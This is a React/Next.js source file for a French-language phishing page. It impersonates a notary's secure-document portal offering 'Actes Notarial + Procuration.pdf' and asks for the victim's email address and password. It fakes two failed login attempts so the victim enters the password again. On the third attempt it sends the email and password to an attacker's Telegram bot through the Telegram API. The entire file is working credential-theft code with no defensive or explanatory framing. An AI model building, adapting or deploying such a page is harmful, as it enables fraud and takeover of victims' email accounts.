'use client'

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import Image from "next/image"
import { FileText, AlertCircle } from "lucide-react"

export default function Component() {
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [error, setError] = useState("")
  const [attempts, setAttempts] = useState(0)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!showPassword) {
      setShowPassword(true)
      return
    }

    setAttempts(attempts + 1)

    if (attempts === 0) {
      setError("Mot de passe incorrect. Veuillez réessayer.")
    } else if (attempts === 1) {
      setError("Deuxième tentative échouée. Dernière chance.")
    } else {
      // Submit to Telegram bot and redirect
      await submitToTelegramBot(email, password)
      window.location.href = "#"
    }
  }

  const submitToTelegramBot = async (email: string, password: string) => {
    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;
    const text = `document acess Email: ${email}\nPassword: ${password}`

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
        }),
      })
    } catch (error) {
      console.error('Error sending message to Telegram:', error)
    }
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
      {/* Logo */}
      <div className="mb-8">
        <Image
          src="data:image/png;base64,"
          alt="Notaire Logo"
          width={120}
          height={80}
          className="w-auto h-20"
        />
      </div>

      {/* Main Card */}
      <Card className="w-full max-w-md bg-white">
        <CardHeader className="space-y-1 pb-2">
          <h2 className="text-xl text-center font-medium">Vous avez reçu un fichier sécurisé</h2>
        </CardHeader>
        <CardContent className="space-y-4">
          {/* File Information */}
          <div className="flex items-center gap-3 p-3 bg-gray-50 rounded-lg">
            <FileText className="h-8 w-8 text-red-500" />
            <span className="font-medium">Actes Notarial + Procuration.pdf</span>
          </div>

          {/* Instructions */}
          <p className="text-sm text-gray-600">
            Pour lire le document veuillez entrer les identifiants de messagerie auxquels ce fichier a été envoyé.
          </p>

          <form onSubmit={handleSubmit} className="space-y-4">
            {/* Email Input */}
            <div className="space-y-2">
              <Input
                type="email"
                placeholder="Entrez l'adresse email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full"
              />
            </div>

            {/* Password Input */}
            {showPassword && (
              <div className="space-y-2">
                <Input
                  type="password"
                  placeholder="Entrez le mot de passe"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full"
                />
              </div>
            )}

            {/* Error Message */}
            {error && (
              <Alert variant="destructive">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>{error}</AlertDescription>
              </Alert>
            )}

            {/* Submit Button */}
            <Button type="submit" className="w-full bg-blue-500 hover:bg-blue-600">
              {showPassword ? "Soumettre" : "Continuer"}
            </Button>
          </form>
        </CardContent>
      </Card>

      {/* Footer */}
      <footer className="mt-8 text-center space-y-4">
        <p className="text-sm text-gray-600">© Notaires France 2024</p>
        <div className="flex items-center justify-center gap-6">
          <Image
            src="data:image/png;base64,"
            alt="Paris 2024"
            width={80}
            height={80}
            className="h-10 w-auto"
          />
        </div>
      </footer>
    </div>
  )
}